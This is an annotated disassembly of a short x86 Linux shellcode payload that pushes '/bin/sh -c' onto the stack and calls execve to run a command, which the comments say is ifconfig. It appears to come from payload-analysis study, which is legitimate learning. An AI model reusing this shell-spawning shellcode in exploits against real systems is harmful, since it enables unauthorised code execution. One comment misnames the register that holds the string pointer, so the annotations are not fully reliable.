push byte 0xb         ; push the value of execve (11) on to the stack
pop eax               ; execve syscall
cwd                   ; zeros out the EDX register as EAX contains a positive value
push edx              ; push the null terminator on to the stack
push word 0x632d      ; push "-c" on to the stack as the payload would execute "/bin/sh -c ifconfig" at the backend 
mov edi, esp          ; preserve the stack pointer in EDI (EDI points to "-c")
push dword 0x68732f   ; push "/bin/sh" on the stack
push dword 0x6e69622f
mov ebx, esp          ; preserve the stack pointer in ESP (ESP points to "/bin/sh")
push edx              ; push the null terminator on to the stack
call 0x1              ; get the command ifconfig
push edi              ; memory location of "-c" is pushed on to the stack
push ebx              ; memory location of "/bin/sh" is pushed on to the stack
mov ecx, esp          ; ECX contains all the arguments for execve
int 0x80      
